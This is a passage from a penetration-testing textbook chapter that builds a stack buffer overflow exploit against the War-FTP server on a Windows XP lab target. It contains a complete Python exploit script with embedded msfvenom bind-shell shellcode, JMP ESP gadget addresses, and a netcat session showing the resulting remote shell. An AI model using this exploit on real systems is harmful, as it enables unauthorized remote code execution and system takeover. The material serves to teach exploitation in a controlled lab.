our <span class="emphasis"><em>C</em></span>s with shellcode, and we will have a complete exploit, right? Close, but not quite. Unfortunately, if we just hardcode the address <code class="literal">00AFFD48</code> into our return address, the exploit may work just fine for us but not in other cases—and we want it to work as universally as possible. As we saw in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, the locations of registers like ESP can change based on program factors such as the length of provided arguments or because the stack is tied to a thread, which means the stack address can differ the next time you attack the application. Lucky for us, jumping to a CPU register to execute its contents is denoted by the assembly language instruction <code class="literal">JMP ESP</code> (or another register name, as needed). In pre-ASLR operating systems, such as our Windows XP SP3 target, Windows DLLs were loaded into the same place in memory every time. That means if we find a <code class="literal">JMP ESP</code> inside an executable module on our Windows XP target, it should be in the same place on every Windows XP SP3 English-language machine.</p><p>For that matter, <code class="literal">JMP ESP</code> is not our only option. As long as we end up with execution pointed to ESP, we can use an equivalent instruction to <code class="literal">JMP ESP</code> or even a series of instructions. For example, <code class="literal">CALL ESP</code> will work, or <code class="literal">PUSH ESP</code> followed by <code class="literal">RET</code>, which sends execution to the memory address in ESP.</p><p>We can find all the occurrences of <code class="literal">JMP ESP</code> and the logical equivalents in the executable modules for War-FTP with the command <code class="literal">!mona jmp -r esp</code>, as shown in <a class="xref" href="ch17.xhtml#searching_for_jmp_esp_with_mona" title="Figure 17-11. Searching for JMP ESP with Mona">Figure 17-11</a>.</p><div class="figure"><a id="searching_for_jmp_esp_with_mona"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00170"/><img alt="Searching for JMP ESP with Mona" src="httpatomoreillycomsourcenostarchimages2030530.png.jpg"/></div></div><div class="figure-title">Figure 17-11. Searching for <code class="literal">JMP ESP</code> with Mona</div></div><p><a class="indexterm" id="iddle1577"/><a class="indexterm" id="iddle2051"/>The results are written to <span class="emphasis"><em>C:\logs\war-ftpd\jmp.txt</em></span>. We are presented with 84 possible <code class="literal">JMP ESP</code> (or equivalent) instructions. Some may contain bad characters (as we’ll discuss later in the chapter)—which instructions should we choose? As a rule of thumb, go for modules that belong to the application itself and not to the operating system. If that is not possible, try relatively stable modules such <span class="emphasis"><em>MSVCRT.dll</em></span> because very few changes have been made to this module in Windows patches compared with other Windows modules (although changes are still possible based on the language of the operating system). The <code class="literal">JMP ESP</code> instructions Mona found in <span class="emphasis"><em>MSVCRT.dll</em></span> are shown next.</p><a id="pro_id00208"/><pre class="programlisting">0x77c35459 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)&#13;
0x77c354b4 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)&#13;
0x77c35524 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)&#13;
0x77c51025 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v7.0.2600.5512 (C:\WINDOWS\system32\MSVCRT.dll)</pre><p><a class="indexterm" id="iddle1123"/><a class="indexterm" id="iddle2016"/>Let’s use the first one: the <code class="literal">PUSH ESP</code> followed by a <code class="literal">RET</code> at <code class="literal">0x77C35459</code>. As in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, we can set a breakpoint to pause execution when we reach our instructions to redirect execution to ESP and make sure everything is working correctly before we replace our <span class="emphasis"><em>C</em></span>s with instructions to be executed. Set a breakpoint at the memory address <code class="literal">0x77C35459</code> with the command <span class="strong"><strong><code class="literal">bp</code></strong></span> <span class="strong"><strong><code class="literal">0x77C35459</code></strong></span> in Immunity Debugger, as shown in <a class="xref" href="ch17.xhtml#breakpoints_in_immunity_debugger" title="Figure 17-12. Breakpoints in Immunity Debugger">Figure 17-12</a>. (To view all currently set breakpoints, go to <span class="strong"><strong>View</strong></span> ▸ <span class="strong"><strong>Breakpoints</strong></span> in Immunity Debugger.)</p><div class="figure"><a id="breakpoints_in_immunity_debugger"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00171"/><img alt="Breakpoints in Immunity Debugger" src="httpatomoreillycomsourcenostarchimages2030532.png.jpg"/></div></div><div class="figure-title">Figure 17-12. Breakpoints in Immunity Debugger</div></div><p>Now replace the four <span class="emphasis"><em>B</em></span>s in your exploit string with the location of the redirection to ESP, as shown in <a class="xref" href="ch17.xhtml#using_a_return_address_from_an_executabl" title="Example 17-5. Using a return address from an executable module">Example 17-5</a>.</p><div class="example"><a id="using_a_return_address_from_an_executabl"/><div class="example-title">Example 17-5. Using a return address from an executable module</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat ftpexploit</strong></span>&#13;
#!/usr/bin/python&#13;
import socket&#13;
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "D" * 607 ❶&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('PASS PASSWORD\r\n')&#13;
s.close()</pre></div></div><p><a class="indexterm" id="iddle1333"/><a class="indexterm" id="iddle1351"/><a class="indexterm" id="iddle2069"/>With a breakpoint prepared, let’s place our new return address at the right location in our attack string at ❶ and change the 611 <span class="emphasis"><em>C</em></span>s to four <span class="emphasis"><em>C</em></span>s followed by 607 <span class="emphasis"><em>D</em></span>s to account for the four bytes of the attack string before ESP. Once the attack string is in place, run the exploit against War-FTP, and see if it reaches our breakpoint in Immunity Debugger, as shown in <a class="xref" href="ch17.xhtml#we_reached_our_breakpointdot" title="Figure 17-13. We reached our breakpoint.">Figure 17-13</a>.</p><div class="figure"><a id="we_reached_our_breakpointdot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00172"/><img alt="We reached our breakpoint." src="httpatomoreillycomsourcenostarchimages2030534.png.jpg"/></div></div><div class="figure-title">Figure 17-13. We reached our breakpoint.</div></div><p>Perfect—notice in the bottom of the Immunity Debugger window that we hit our breakpoint.</p><div class="note" title="Note"><h3 class="title"><a id="ch17note05"/>Note</h3><p>If you forget to take endianness into account, you might not reach your breakpoint; instead, the program will crash with an access violation at <code class="literal">5954C377</code>. Be sure to flip the bytes around to little-endian format.</p></div><p><a class="indexterm" id="iddle2146"/><a class="indexterm" id="iddle2238"/>The next command to be executed is shown in the top left of the Immunity Debugger window in the CPU pane. Use F7 to execute one command at a time rather than have the program continue running normally. We press <span class="strong"><strong>F7</strong></span> twice to execute the <code class="literal">PUSH ESP</code> and <code class="literal">RET</code> instructions, and, as expected, execution is redirected to the beginning of our <span class="emphasis"><em>D</em></span>s (44 in hex), as shown in <a class="xref" href="ch17.xhtml#redirecting_execution_to_our_attack_stri" title="Figure 17-14. Redirecting execution to our attack string">Figure 17-14</a>.</p><div class="figure"><a id="redirecting_execution_to_our_attack_stri"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00173"/><img alt="Redirecting execution to our attack string" src="httpatomoreillycomsourcenostarchimages2030536.png.jpg"/></div></div><div class="figure-title">Figure 17-14. Redirecting execution to our attack string</div></div></div><div class="sect1" title="Getting a Shell"><div class="titlepage"><div><div><h2 class="title" id="getting_a_shell" style="clear: both">Getting a Shell</h2></div></div></div><p>Now we just need to put something useful in place of the <span class="emphasis"><em>D</em></span>s from the previous section for the CPU to execute on our behalf. In <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, we used the Metasploit tool Msfvenom to generate malicious executables. We can also use it to create raw shellcode to put in our handwritten exploits. For instance, we can tell our hijacked CPU to open a bind shell on TCP port 4444 (or any other port) by using Msfvenom to generate the shellcode for a Metasploit payload.</p><p>We need to tell Msfvenom the payload to use—in this case <span class="emphasis"><em>windows/shell_bind_tcp</em></span>, the inline Windows command shell. We also need to provide it with the maximum size we can have for our shellcode.</p><div class="note" title="Note"><h3 class="title"><a id="ch17note06"/>Note</h3><p><a class="indexterm" id="iddle1774"/><a class="indexterm" id="iddle1912"/><a class="indexterm" id="iddle2208"/>As you experiment with crashing War-FTP, you will notice that you can actually make the attack string slightly bigger, but things start to act strangely around 1,150 characters. (We will see what this is all about in <a class="xref" href="ch18.xhtml" title="Chapter 18. Structured Exception Handler Overwrites">Chapter 18</a>.) At 1,100 characters we are safe, and our exploit will work as expected each time.</p></div><p>Our current exploit string has 607 <span class="emphasis"><em>D</em></span>s, so we have 607 bytes for our shellcode. Finally, we need to tell Msfvenom which special characters to avoid when creating the payload. In this case, we need to avoid the null byte (\x00), carriage return (\x0d), line feed (\x0a), and @ (\x40).</p><div class="note" title="Note"><h3 class="title"><a id="ch17note07"/>Note</h3><p>Finding bad characters is an advanced topic beyond the scope of this book, so just trust me that these are the right ones for this exploit. These bad characters make sense: The null byte terminates a string, carriage return and line feed denote a new line, and <span class="emphasis"><em>@</em></span> will break the <span class="emphasis"><em>user@server</em></span> syntax for an FTP login. For more information on this topic, check out my blog post “Finding Bad Characters with Immunity Debugger and Mona.py” (<span class="emphasis"><em><a class="ulink" href="http://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/" target="_top">http://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/</a></em></span>).</p></div><p>Feed this information into Msfvenom, as shown in <a class="xref" href="ch17.xhtml#generating_shellcode_with_msfvenom" title="Example 17-6. Generating shellcode with Msfvenom">Example 17-6</a>.</p><div class="example"><a id="generating_shellcode_with_msfvenom"/><div class="example-title">Example 17-6. Generating shellcode with Msfvenom</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/shell_bind_tcp -s 607 -b '\x00\x40\x0a\x0d'</strong></span>&#13;
[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)&#13;
buf =&#13;
"\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +&#13;
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +&#13;
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +&#13;
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +&#13;
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +&#13;
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +&#13;
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +&#13;
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +&#13;
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +&#13;
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +&#13;
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +&#13;
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +&#13;
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +&#13;
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +&#13;
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +&#13;
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +&#13;
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +&#13;
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +&#13;
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +&#13;
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +&#13;
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +&#13;
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +&#13;
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +&#13;
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +&#13;
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +&#13;
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +&#13;
"\x09\x0e\xd0\x2b"</pre></div></div><p><a class="indexterm" id="iddle1215"/><a class="indexterm" id="iddle2418"/>Msfvenom generated our shellcode in 368 bytes, leaving us plenty of room to spare. Replace the <span class="emphasis"><em>D</em></span>s in the exploit with the generated shellcode, as shown in <a class="xref" href="ch17.xhtml#our_finished_exploit" title="Example 17-7. Our finished exploit">Example 17-7</a>.</p><div class="example"><a id="our_finished_exploit"/><div class="example-title">Example 17-7. Our finished exploit</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat ftpexploit</strong></span>&#13;
#!/usr/bin/python&#13;
import socket&#13;
shellcode = ("\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +&#13;
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +&#13;
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +&#13;
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +&#13;
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +&#13;
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +&#13;
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +&#13;
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +&#13;
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +&#13;
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +&#13;
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +&#13;
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +&#13;
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +&#13;
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +&#13;
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +&#13;
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +&#13;
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +&#13;
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +&#13;
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +&#13;
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +&#13;
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +&#13;
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +&#13;
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +&#13;
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +&#13;
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +&#13;
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +&#13;
"\x09\x0e\xd0\x2b")&#13;
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + shellcode&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('PASS PASSWORD\r\n')&#13;
s.close()</pre></div></div><p>When you try running the exploit, something unexpected happens. Though we are still able to hit our breakpoint and redirect execution to our shellcode, War-FTP crashes before we receive our bind shell on port 4444. Something in the shellcode is causing a crash, as shown in <a class="xref" href="ch17.xhtml#war-ftp_crashes" title="Figure 17-15. War-FTP crashes">Figure 17-15</a>.</p><div class="figure"><a id="war-ftp_crashes"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00174"/><img alt="War-FTP crashes" src="httpatomoreillycomsourcenostarchimages2030538.png.jpg"/></div></div><div class="figure-title">Figure 17-15. War-FTP crashes</div></div><p><a class="indexterm" id="iddle1079"/><a class="indexterm" id="iddle1420"/><a class="indexterm" id="iddle1682"/>Msfvenom’s encoded shellcode needs to first decode itself before executing, and as part of the decoding process, it needs to find its location in memory using a routine called getPC. A common technique for finding the current location in memory includes using an instruction called <code class="literal">FSTENV</code>, which writes a structure onto the stack, overwriting what’s there—in our case part of the shellcode. All we need to do to fix this is move ESP away from the shellcode, so getPC has room to work without corrupting our shellcode. (The problem in general is that if the values in EIP and ESP are too close together, shellcode tends to corrupt itself, either during decoding or during execution.) This is what caused our crash in the previous run.</p><p>We can use the Metasm utility to turn a simple assembly instruction into shellcode that we can drop into our exploit. We need to move ESP away from our shellcode in memory. We can do this using the assembly <code class="literal">ADD</code> instruction. The syntax is <code class="literal">ADD</code> <span class="emphasis"><em><code class="literal">destination, amount</code></em></span>. Because our stack consumes lower memory addresses, let’s subtract 1,500 bytes from ESP. The number of bytes should be large enough to avoid corruption; 1,500 bytes is usually a safe choice.</p><p>Change directories to <span class="emphasis"><em>/usr/share/metasploit-framework/tools</em></span> and start <span class="emphasis"><em>metasm_shell.rb</em></span>, as shown in <a class="xref" href="ch17.xhtml#generating_shellcode_with_metasm" title="Example 17-8. Generating shellcode with Metasm">Example 17-8</a>.</p><div class="example"><a id="generating_shellcode_with_metasm"/><div class="example-title">Example 17-8. Generating shellcode with Metasm</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>cd /usr/share/metasploit-framework/tools/</strong></span>&#13;
root@kali:/usr/share/metasploit-framework/tools# <span class="strong"><strong>./metasm_shell.rb</strong></span>&#13;
type "exit" or "quit" to quit&#13;
use ";" or "\n" for newline&#13;
metasm &gt; <span class="strong"><strong>sub esp, 1500</strong></span>❶&#13;
"\x81\xec\xdc\x05\x00\x00"&#13;
metasm &gt; <span class="strong"><strong>add esp, -1500</strong></span>❷&#13;
"\x81\xc4\x24\xfa\xff\xff"</pre></div></div><p>If we try <span class="strong"><strong><code class="literal">sub esp, 1500</code></strong></span> ❶, the resulting shellcode includes null bytes, and, as discussed earlier, a null byte is a bad character that needs to be avoided due to the FTP specification. Instead, enter <span class="strong"><strong><code class="literal">add esp, -1500</code></strong></span> ❷ (a logical equivalent) into the <code class="literal">metasm</code> prompt.</p><p>Now add the resulting shellcode to the exploit right before the <span class="emphasis"><em>windows/shell_bind_tcp</em></span> shellcode, as shown in <a class="xref" href="ch17.xhtml#exploit_with_esp_moved_out_of_the_way" title="Example 17-9. Exploit with ESP moved out of the way">Example 17-9</a>.</p><div class="example"><a id="exploit_with_esp_moved_out_of_the_way"/><div class="example-title">Example 17-9. Exploit with ESP moved out of the way</div><div class="example-contents"><pre class="programlisting">#!/usr/bin/python&#13;
import socket&#13;
shellcode = ("\xda\xd4\xd9\x74\x24\xf4\xba\xa6\x39\x94\xcc\x5e\x2b\xc9" +&#13;
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\xb2\xdb\x61\x30" +&#13;
"\x52\x92\x8a\xc9\xa2\xc5\x03\x2c\x93\xd7\x70\x24\x81\xe7" +&#13;
"\xf3\x68\x29\x83\x56\x99\xba\xe1\x7e\xae\x0b\x4f\x59\x81" +&#13;
"\x8c\x61\x65\x4d\x4e\xe3\x19\x8c\x82\xc3\x20\x5f\xd7\x02" +&#13;
"\x64\x82\x17\x56\x3d\xc8\x85\x47\x4a\x8c\x15\x69\x9c\x9a" +&#13;
"\x25\x11\x99\x5d\xd1\xab\xa0\x8d\x49\xa7\xeb\x35\xe2\xef" +&#13;
"\xcb\x44\x27\xec\x30\x0e\x4c\xc7\xc3\x91\x84\x19\x2b\xa0" +&#13;
"\xe8\xf6\x12\x0c\xe5\x07\x52\xab\x15\x72\xa8\xcf\xa8\x85" +&#13;
"\x6b\xad\x76\x03\x6e\x15\xfd\xb3\x4a\xa7\xd2\x22\x18\xab" +&#13;
"\x9f\x21\x46\xa8\x1e\xe5\xfc\xd4\xab\x08\xd3\x5c\xef\x2e" +&#13;
"\xf7\x05\xb4\x4f\xae\xe3\x1b\x6f\xb0\x4c\xc4\xd5\xba\x7f" +&#13;
"\x11\x6f\xe1\x17\xd6\x42\x1a\xe8\x70\xd4\x69\xda\xdf\x4e" +&#13;
"\xe6\x56\xa8\x48\xf1\x99\x83\x2d\x6d\x64\x2b\x4e\xa7\xa3" +&#13;
"\x7f\x1e\xdf\x02\xff\xf5\x1f\xaa\x2a\x59\x70\x04\x84\x1a" +&#13;
"\x20\xe4\x74\xf3\x2a\xeb\xab\xe3\x54\x21\xda\x23\x9b\x11" +&#13;
"\x8f\xc3\xde\xa5\x3e\x48\x56\x43\x2a\x60\x3e\xdb\xc2\x42" +&#13;
"\x65\xd4\x75\xbc\x4f\x48\x2e\x2a\xc7\x86\xe8\x55\xd8\x8c" +&#13;
"\x5b\xf9\x70\x47\x2f\x11\x45\x76\x30\x3c\xed\xf1\x09\xd7" +&#13;
"\x67\x6c\xd8\x49\x77\xa5\x8a\xea\xea\x22\x4a\x64\x17\xfd" +&#13;
"\x1d\x21\xe9\xf4\xcb\xdf\x50\xaf\xe9\x1d\x04\x88\xa9\xf9" +&#13;
"\xf5\x17\x30\x8f\x42\x3c\x22\x49\x4a\x78\x16\x05\x1d\xd6" +&#13;
"\xc0\xe3\xf7\x98\xba\xbd\xa4\x72\x2a\x3b\x87\x44\x2c\x44" +&#13;
"\xc2\x32\xd0\xf5\xbb\x02\xef\x3a\x2c\x83\x88\x26\xcc\x6c" +&#13;
"\x43\xe3\xfc\x26\xc9\x42\x95\xee\x98\xd6\xf8\x10\x77\x14" +&#13;
"\x05\x93\x7d\xe5\xf2\x8b\xf4\xe0\xbf\x0b\xe5\x98\xd0\xf9" +&#13;
"\x09\x0e\xd0\x2b")&#13;
buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + shellcode&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('PASS PASSWORD\r\n')&#13;
s.close()</pre></div></div><p>With ESP out of the way, and knowing that our shellcode won’t be corrupted in the process of being decoded or executed, run the exploit again and use Netcat on Kali Linux to connect to TCP port 4444 on the Windows target, as shown here.</p><a id="pro_id00209"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.10 4444</strong></span>&#13;
Microsoft Windows XP [Version 5.1.2600]&#13;
(C) Copyright 1985-2001 Microsoft Corp.&#13;
&#13;
C:\Documents and Settings\Georgia\Desktop&gt;</pre><p>Sure enough, we now have a shell on the Windows target, as shown by the Windows command prompt above.</p></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00047" style="clear: both">Summary</h2></div></div></div><p>In this chapter we used our knowledge from <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a> to exploit a real-world vulnerable program: the War-FTP program with a buffer overflow issue in the Username field. We crashed the program and located the return address, and then, instead of hardcoding a memory address for the overwritten return address, we found a <code class="literal">JMP ESP</code> instruction in a loaded DLL. We then filled the attacker-controlled ESP register with shellcode generated by Msfvenom. Now we’ve managed to hijack control of a real program.</p><p>In the next chapter, we will look at another Windows exploitation technique, structured exception handler overwrites.</p></div></section></body></html>